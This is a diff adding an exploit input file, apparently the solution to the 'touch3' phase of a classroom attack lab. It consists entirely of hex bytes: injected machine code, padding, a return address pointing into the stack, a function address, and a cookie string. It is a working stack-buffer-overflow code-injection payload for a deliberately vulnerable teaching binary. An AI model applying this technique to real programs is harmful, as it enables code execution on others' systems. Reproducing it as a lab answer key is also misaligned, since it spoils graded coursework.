@@ -1,0 +1,11 @@
+/* Code */
+48 c7 c7 60 81 67 55 c3
+/* Padding with 16 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* Address of stack */
+38 81 67 55 00 00 00 00
+/* Address of touch3 */
+5a 1a 40 00 00 00 00 00
+/* Hex value of cookie */
+36 38 65 32 64 39 39 61 00
